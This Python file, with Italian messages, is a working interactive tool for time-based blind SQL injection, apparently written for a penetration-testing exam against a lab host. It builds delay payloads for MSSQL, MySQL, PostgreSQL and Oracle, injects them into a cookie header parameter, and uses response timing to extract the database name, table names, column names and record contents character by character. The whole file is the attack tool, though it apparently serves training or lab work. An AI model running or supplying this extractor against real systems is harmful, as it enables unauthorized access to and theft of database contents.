import requests
import time
import sys


class SQLInjectionExtractor:
    """Classe genitore per estrattori SQL Injection"""
    DELAY: int = 10
    url: str = 'http://10.129.204.202'
    SQL_TYPE: str = 'MSSQL'  # MSSQL | MYSQL | POSTGRESQL | ORACLE
    post_target: str = None
    get_target: str = None
    header_target: object = None    # ex. {"Cookie": f"PHPSESSID=nqgure9mkvdgttujk25g2mehgu;TrackingId=5ada769c29c97c7b24be712c4c5702f6"}
    delimiter: str = ';'
    header_parameter_target = None    # ex. "TrackingId"
    verbose: bool = True
    optimizer: str = 'anding' # anding | bisection


    def set_delay(self, delay: int):
        self.DELAY = delay
        globals()['DELAY'] = delay

    def set_url(self, url: str):
        normalized_url = url.strip()
        if not normalized_url.startswith(("http://", "https://")):
            normalized_url = f"http://{normalized_url}"
        self.url = normalized_url
        
    def set_sql_type(self, sql_type: str):
        if sql_type.upper() in ['MSSQL', 'MYSQL', 'POSTGRESQL', 'ORACLE']:
            self.SQL_TYPE = sql_type.upper()
        else:
            print("SQL_TYPE non valido. Valori accettati: MSSQL, MYSQL, POSTGRESQL, ORACLE")
            return

    def set_post_target(self, post_query: str):
        #self.post_target = post_query
        pass

    def set_get_target(self, get_query: str):
        #self.get_target = get_query
        pass

    def set_header_target(self, header: object):
        self.header_target = header

    def add_header_target(self, header: object):
        if not self.header_target:
             self.header_target = header
        else:
            self.header_target = {**self.header_target, **header}
    
    def set_header_parameter_target(self, parameter: str):
        if not self.header_target:
            print("Errore: è necessario impostare prima un header target (funzione set_header_target() o add_header_target())")
            return

        parameter = parameter.strip()
        if not parameter:
            print("Errore: il nome del parametro target non può essere vuoto.")
            return

        # The target parameter (e.g., TrackingId) is searched inside header values.
        parameter_found = False
        for value in self.header_target.values():
            if isinstance(value, str) and parameter in value:
                parameter_found = True
                break

        if not parameter_found:
            print(f"Errore: il parametro '{parameter}' non è presente nei valori dell'header target. Header fornito: {self.header_target}")
            return
        
        self.header_parameter_target = parameter

    def set_verbose(self, verbose: bool):
        self.verbose = verbose

    def set_optimizer(self, optimizer: str):
        if optimizer.lower() in ['anding', 'bisection']:
            self.optimizer = optimizer.lower()
        else:
            print("Optimizer non valido. Valori accettati: anding, bisection")
            return

    def set_delimiter(self, delimiter: str):
        self.delimiter = delimiter

    def is_really_time_based_injection(self):
        res = self.oracle('1=1')
        return res

    def internal_check_target(self):
        if not self.post_target and not self.get_target and not self.header_target:
            print("Errore: è necessario impostare almeno un target (funzione set_post_target(), set_get_target() o set_header_target()) per definire automaticamente il tipo di SQL Injection")
            return False
        return True

    def get_delayed_query(self, q):
        if 'MSSQL' == self.SQL_TYPE:
            query = f"';IF({q}) WAITFOR DELAY '0:0:{self.DELAY}'--"
        elif 'MYSQL' == self.SQL_TYPE:
            query = f"';IF({q}) THEN SLEEP({self.DELAY})--"
        elif 'POSTGRESQL' == self.SQL_TYPE:
            query = f"';IF({q}) THEN PG_SLEEP({self.DELAY})--"
        elif 'ORACLE' == self.SQL_TYPE:
            #query = "AND 1234=DBMS_PIPE.RECEIVE_MESSAGE('RaNdStR',10)"
            query = f"';IF({q}) THEN DBMS_LOCK.SLEEP({self.DELAY})--"

        return query
    
    def encode_query(self, q):
        encoded_query = requests.utils.quote(q)
        if self.verbose: print(f"Encoded query: {encoded_query}")
        return encoded_query
    
    # Not developed because out of exam scope
    def get_encoded_post_query(self, q):
        #encoded_query = requests.utils.quote(injected_header)
        #if self.verbose: print(f"Oracle query: {encoded_query}")
        print("WARNING - Injection with POST parameter not developed because out of exam scope")
        return q

    # Not developed because out of exam scope
    def get_encoded_get_query(self, q):
        #encoded_query = requests.utils.quote(injected_header)
        #if self.verbose: print(f"Oracle query: {encoded_query}")
        print("WARNING - Injection with GET parameter not developed because out of exam scope")
        return q

    def get_encoded_header_query(self, q):
        if not self.header_parameter_target:
            print("Errore: è necessario impostare prima un header parameter target (funzione set_header_parameter_target())")
            return None
        
        injected_header = dict(self.header_target)
        injected = False
        delayed_query = self.get_delayed_query(q)

        for header, value in self.header_target.items():
            if not isinstance(value, str):
                continue

            if self.header_parameter_target not in value:
                continue

            parameters = value.split(self.delimiter)
            for i, param in enumerate(parameters):
                param_name = param.strip().split("=", 1)[0].strip()
                if param_name != self.header_parameter_target:
                    continue

                parameters[i] = param + delayed_query
                injected_header[header] = self.delimiter.join(parameters)
                injected = True
                break

            if injected:
                break

        if not injected:
            print(f"Errore: non è stato possibile iniettare la query nell'header. Verificare che il parametro '{self.header_parameter_target}' sia presente in uno dei valori dell'header target e che il delimitatore '{self.delimiter}' sia corretto.")
            return None

        if self.verbose:
            print(f"Injected headers: {injected_header}")

        return injected_header

        
    def oracle(self, q):
        if not self.internal_check_target(): return
        if not self.SQL_TYPE: self.define_sql_type()


        start = time.time()
        if self.post_target:
            data = self.get_encoded_post_query(q)
            if not data: return

            r = requests.post(
                self.url,
                data=data,
                headers=self.header_target
            )
        
        else:
            if self.get_target:
                url = self.get_encoded_get_query(q)
                if not url: return

                r = requests.get(url, headers=self.header_target)
            else:
                headers = self.get_encoded_header_query(q)
                if not headers: return

                r = requests.get(
                    self.url,
                    headers = headers
    #                headers={"Cookie": f"PHPSESSID=nqgure9mkvdgttujk25g2mehgu;TrackingId=5ada769c29c97c7b24be712c4c5702f6{query}"}
                )

            #return r.status_code == 200
        return time.time() - start > self.DELAY

    def dump_length(self, q):
        length = 0
        for p in range(7):
            if self.oracle(f"({q})&{2**p}>0"):
                length |= 2**p

        return length

    def dump_string_anding(self, q, length):
        val = ""
        for i in range(1, length + 1):
            c = 0
            for p in range(7):
                if self.oracle(f"ASCII(SUBSTRING(({q}),{i},1))&{2**p}>0"):
                    c |= 2**p
            
            print(chr(c), end='', flush=True)
            sys.stdout.flush()
            val += chr(c)
        
        print('\r\n')
        return val

    def dump_string_bisection(self, q, length):
        val = ""
        for i in range(1, length + 1):
            low = 0
            high = 127
            while low <= high:
                mid = (low + high) // 2
                if self.oracle(f"ASCII(SUBSTRING(({q}),{i},1)) BETWEEN {low} AND {mid}"):
                    high = mid -1
                else:
                    low = mid + 1
            print(chr(low), end='', flush=True)
            sys.stdout.flush()
            val += chr(low)
        print('\r\n')
        return val
    


class BlindSQLITimeExtractor(SQLInjectionExtractor):
    db_name: str = None
    tables_names: list = []
    table_target: str = None
    column_names: list = []


    def set_db_name(self, db_name: str):
        self.db_name = db_name

    def set_table_target(self, table_name: str):
        if self.tables_names and table_name not in self.tables_names:
            print(f"Errore: la tabella '{table_name}' non è presente nella lista delle tabelle scoperte. Tabelle scoperte: {self.tables_names}")
            return
        self.table_target = table_name


    def extract_db_name(self):
        db_name_length = self.dump_length("LEN(db_name())")
        if not db_name_length:
            print("Errore: non è stato possibile determinare la lunghezza del nome del database. Verificare che la connessione al database sia corretta e che la funzione db_name() sia supportata.")
            return
        print(f"Il nome del DB è lungo {db_name_length} caratteri.")
        
        if self.optimizer == 'anding':
            db_name = self.dump_string_anding("db_name()", db_name_length)
        elif self.optimizer == 'bisection':
            db_name = self.dump_string_bisection("db_name()", db_name_length)

        print(f"Il nome del DB è: {self.db_name}")
        if db_name: self.db_name = db_name
        
        return self.db_name

    def extract_tables(self):
        if not self.db_name:
            print("Errore: è necessario scoprire/inserire prima il nome del database (funzione discoverDBName())")
            return
        
        num_tables = self.dump_length(f"SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='{self.db_name}'")
        if not num_tables:
            print(f"Errore: non è stato possibile determinare il numero di tabelle presenti nel database '{self.db_name}'. Verificare che la connessione al database sia corretta e che la query per contare le tabelle sia supportata.")
            return
        print(f"Il numero di tabelle nel DB è: {num_tables}")

        for i in range(num_tables):
            table_name_length = self.dump_length(f"select LEN(table_name) from information_schema.tables where table_catalog='{self.db_name}' order by table_name offset {i} rows fetch next 1 rows only")
            print(f"Tabella {i} - lunghezza nome: {table_name_length}")

            q = f"select table_name from information_schema.tables where table_catalog='{self.db_name}' order by table_name offset {i} rows fetch next 1 rows only"
            table_name = self.dump_string_anding(q, table_name_length) if self.optimizer == 'anding' else self.dump_string_bisection(q, table_name_length)
            print(f"Tabella {i} - nome: {table_name}")
            if table_name: self.tables_names.append(table_name)

        return self.tables_names

    def _extract_column_names(self):
        num_columns = self.dump_length(f"SELECT COUNT(*) FROM information_schema.columns WHERE TABLE_CATALOG='{self.db_name}' AND TABLE_NAME='{self.table_target}'")
        if not num_columns:
            print(f"Errore: non è stato possibile determinare il numero di colonne presenti nella tabella '{self.table_target}'. Verificare che la connessione al database sia corretta e che la query per contare le colonne sia supportata.")
            return
        print(f"Il numero di colonne nella tabella {self.table_target} è: {num_columns}")
        print("Sono presenti le seguenti colonne: ", end='\r\n')

        for i in range(num_columns):
            column_name_length = self.dump_length(f"select LEN(column_name) from information_schema.columns where table_catalog='{self.db_name}' AND table_name='{self.table_target}' order by column_name offset {i} rows fetch next 1 rows only")
            if self.verbose: print(f"Colonna {i} - lunghezza nome: {column_name_length}")
            
            q = f"select column_name from information_schema.columns where table_catalog='{self.db_name}' AND table_name='{self.table_target}' order by column_name offset {i} rows fetch next 1 rows only"
            column_name = self.dump_string_anding(q, column_name_length) if self.optimizer == 'anding' else self.dump_string_bisection(q, column_name_length)
            print(f"{i} - {column_name}")
            if column_name: self.column_names.append(column_name)

        return self.column_names

    def _extract_rows_length(self):
        num_rows = self.dump_length(f"SELECT COUNT(*) FROM {self.table_target}")
        if not num_rows:
            print(f"Errore: non è stato possibile determinare il numero di righe presenti nella tabella '{self.table_target}'. Verificare che la connessione al database sia corretta e che la query per contare le righe sia supportata.")
            return
        print(f"Nella tabella {self.table_target} ci sono {num_rows} righe.")

        return num_rows

    def extract_table_info(self, table_name):
        if not self.db_name:
            print("Errore: è necessario scoprire prima il nome del database (funzione discoverDBName())")
            return
        
        self.set_table_target(table_name)
        self._extract_column_names()
        self._extract_rows_length()

    def extract_record_content(self, column_name, row_number):
        if not self.table_target:
            print("Errore: è necessario impostare prima la tabella target (funzione set_table_target())")
            return
        
        record_length = self.dump_length(f"SELECT LEN({column_name}) FROM {self.table_target} ORDER BY {column_name} OFFSET {row_number - 1} ROWS FETCH NEXT 1 ROWS ONLY")
        if not record_length:
            print(f"Errore: non è stato possibile determinare la lunghezza del contenuto della riga {row_number} nella colonna {column_name}. Verificare che la tabella '{self.table_target}' e la colonna '{column_name}' esistano e che il numero di riga sia corretto.")
            return
        print(f"La lunghezza del contenuto della riga {row_number} nella colonna {column_name} è: {record_length}")

        q = f"SELECT {column_name} FROM {self.table_target} ORDER BY {column_name} OFFSET {row_number - 1} ROWS FETCH NEXT 1 ROWS ONLY"
        record_content = self.dump_string_anding(q, record_length) if self.optimizer == 'anding' else self.dump_string_bisection(q, record_length)
        print(f"Il contenuto della riga {row_number} nella colonna {column_name} è: ", end='\r\n')
        print(record_content)
        print('\r\n')

        return record_content
    

extractor = BlindSQLITimeExtractor()
if __name__ == "__main__":
    print("\n" + "="*50)
    print("CONSOLE INTERATTIVA - Blind SQL Injection - Time-Based")
    print("="*50 + "\n")
    db_name = None
    
    url_input = input(f"Inserisci l'url da utilizzare (default: {extractor.url}): ").strip()
    if url_input:
        extractor.set_url(url_input)
    print(f"URL selezionato: {extractor.url}\n")

    delay_input = input(f"Inserisci l'IP da utilizzare (default: {extractor.delay}): ").strip()
    if delay_input:
        extractor.set_delay(delay_input)
    print(f"Delay selezionato: {extractor.delay}\n")
    
    db_name_input = input(f"Inserisci il nome del database (default: {extractor.db_name}): ").strip()
    if db_name_input:
        extractor.set_db_name(db_name_input)
    print(f"Nome del database selezionato: {extractor.db_name}\n")
    
    # Funzioni
    print("Funzioni disponibili:")
    print("1. Estrai il nome del DB")
    print("2. Estrai le tabelle presenti nel DB")
    print("3. Estrai le colonne e il numero di righe di una tabella")
    print("4. Estrai il contenuto di uno specifico record")

    
    while True:
        scelta = input("\nSeleziona una funzione (1/2/3/4) oppure 'q' per uscire: ").strip().lower()
        
        if scelta == 'q':
            print("Uscita dal programma.")
            break
        elif scelta == '1':
            extractor.extract_db_name()
        elif scelta == '2':
            extractor.extract_tables()
        elif scelta == '3':
            table_name = input("Inserisci il nome della tabella: ").strip()
            if table_name:
                extractor.extract_table_info(table_name)
            else:
                print("Errore: il nome della tabella è obbligatorio!")
        elif scelta == '4':
            column_name = input("Inserisci il nome della colonna: ").strip()
            table_name = input("Inserisci il nome della tabella: ").strip()
            row_number = input("Inserisci il numero della riga (partendo da 1): ").strip()
            if table_name and column_name and row_number:
                extractor.extract_record_content(column_name, int(row_number))
            else:
                print("Errore: tutti i parametri sono obbligatori!")
        else:
            print("Scelta non valida. Inserisci 1, 2, 3 oppure 4.")
    
    print("\n" + "="*50)
    print("Programma terminato")
    print("="*50 + "\n")
